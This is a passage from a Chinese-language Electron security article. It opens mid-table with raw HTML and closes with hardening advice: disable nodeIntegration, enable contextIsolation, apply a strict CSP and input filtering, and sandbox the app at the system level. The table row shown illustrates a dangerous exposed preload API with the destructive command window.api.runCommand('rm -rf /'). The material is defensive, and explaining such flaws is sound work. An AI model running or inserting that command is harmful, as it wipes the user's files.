leaf="">预加载脚本漏洞</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">暴露危险API</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span><span leaf="">window.api.runCommand(&#39;rm -rf /&#39;) </span></span></p></td></tr></tbody></table>####   
#### 总结  
- 关闭 nodeIntegration、启用 contextIsolation、严格 CSP 与输入过滤，是底线中的底线！  
  
- 最后防线：即使所有防护失效，通过系统级沙箱（如 App Sandbox on macOS）限制 Electron 应用权限，防止系统级灾难  
  
